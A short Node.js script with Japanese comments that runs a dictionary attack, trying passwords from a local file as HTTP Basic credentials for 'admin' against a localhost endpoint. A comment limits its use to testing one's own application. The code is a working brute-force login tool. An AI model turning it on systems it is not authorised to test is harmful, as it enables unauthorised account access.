// 厳格モード
'use strict';
// requestモジュール呼び出し
const request = require('request');
// fsモジュール呼び出し
const fs = require('fs');
// readlineモジュール呼び出し
const readline = require('readline');
/** 
 * readstream生成
 * 第一引数：ファイル名
*/
const rs = fs.ReadStream('password');
/**
 * readline生成
 * 第一引数：readline設定オブジェクト
 */
const rl = readline.createInterface({
    // input: 読み込み対象のreadstream
    input: rs,
    output: {}
});
/**
 * requestモジュールを使用して辞書攻撃を試みる関数
 * @param {*} line 
 */
const requestFunc = function (line) {
    /**
     * 辞書攻撃の結果を標準出力に表示する関数
     * @param {*} error
     * @param {*} response
     * @param {*} body
     */
    const logFunc = function (error, response, body) {
        if(!error && response.statusCode === 401)
            console.log(`Password is not "${line}"`);
        // errorがfalsyでステータスコードが200ならパスワード突破と判断する
        if (!error && response.statusCode === 200) {
            // 突破したパスワードを表示する
            console.log(`Password is "${line}"`);
            // プロセスを終了する
            process.exit();
        }
    }

    /**
     * requestモジュールを用いてパスワード突破を試みる
     * 不正アクセス禁止法に抵触しないよう自分の開発アプリケーションの検証用途に用いること
     * 第一引数：アクセスを試みるURL
     * 　　　　　http://{ユーザー名}:{パスワード}@{ホスト名}/{リソース名？}の形式
     * 　　　　　ちなみにpostgreSQLに接続した時のURLの形式は
     * 　　　　　{DBの種類}://{ユーザー名}:{パスワード}@{ホスト名}/{データベース名}
     * 　　　　　似てる。
     * 第二引数：リクエスト結果を受けて実行する関数
     */
    request(`http://admin:${line}@localhost:8000/posts`, logFunc);
}
// 'line'イベント発生時（一行ずつreadstreamから読み込む）に実行する関数を設定する
rl.on('line', requestFunc);
// 'close'イベント発生時（readstreamからの読み取り終了時）に実行する関数を設定する
// process.exit()が実行されたときにも実行される
rl.on('close', () => {
    console.log('password file was closed.');
});
// 読み込み処理を開始する
rl.resume();
